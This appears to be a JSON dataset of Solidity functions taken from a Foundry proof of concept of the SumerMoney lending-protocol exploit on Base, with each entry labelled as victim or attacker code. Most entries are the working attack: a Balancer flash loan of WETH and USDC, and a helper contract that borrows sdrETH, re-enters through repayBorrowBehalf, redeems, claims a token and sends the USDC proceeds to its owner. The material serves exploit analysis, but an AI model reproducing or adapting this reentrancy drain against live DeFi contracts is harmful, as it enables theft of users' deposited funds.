[
  {
    "contract/interface": "IClaimer",
    "source_type": "victim_contract",
    "function_name": "claim",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() external {\n        // exchangeRate == getCashPrior() + totalBorrows - totalReserves / totalSupply\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        WETH.withdraw(amounts[0]);\n\n        // sdrETH.exchangeRate\n        emit log_named_decimal_uint(\"Before re-enter, sdrETH exchangeRate\", sdrETH.exchangeRateCurrent(), 18);\n\n        sdrETH.mint{value: amounts[0]}();\n\n        helper = new Helper{value: 1}();\n        USDC.transfer(address(helper), amounts[1]);\n        helper.borrow(amounts[1]);\n\n        WETH.deposit{value: amounts[0]}();\n        WETH.transfer(address(Balancer), amounts[0]);\n        USDC.transfer(address(Balancer), amounts[1]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(cbETH), \"cbETH\");\n        vm.label(address(sdrETH), \"sdrETH\");\n        vm.label(address(sdrUSDC), \"sdrUSDC\");\n        vm.label(address(sdrcbETH), \"sdrcbETH\");\n        vm.label(address(claimer), \"claimer\");\n        vm.createSelectFork(\"Base\", blocknumToForkFrom);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SumerMoney",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 1);\n        address[] memory tokens = new address[](2);\n        tokens[0] = address(WETH);\n        tokens[1] = address(USDC);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 150 ether;\n        amounts[1] = 645_000 * 1e6;\n        bytes memory userData = \"\";\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\"Attacker USDC Balance After exploit\", USDC.balanceOf(address(this)), 6);\n        emit log_named_decimal_uint(\"Attacker cbETH Balance After exploit\", cbETH.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Helper",
    "source_type": "attacker_contract",
    "function_name": "borrow",
    "original_code": "    function borrow(\n        uint256 amount\n    ) external {\n        USDC.approve(address(sdrUSDC), amount);\n        sdrUSDC.mint(amount);\n\n        uint256 borrowAmount = address(sdrETH).balance;\n        sdrETH.borrow(borrowAmount);\n\n        sdrETH.repayBorrowBehalf{value: borrowAmount + 1}(address(this)); // reentrancy\n\n        sdrUSDC.redeem(sdrUSDC.balanceOf(address(this)));\n        uint256[] memory tokenIds = new uint256[](1);\n        tokenIds[0] = 311;\n        claimer.claim(tokenIds);\n        USDC.transfer(owner, USDC.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  }
]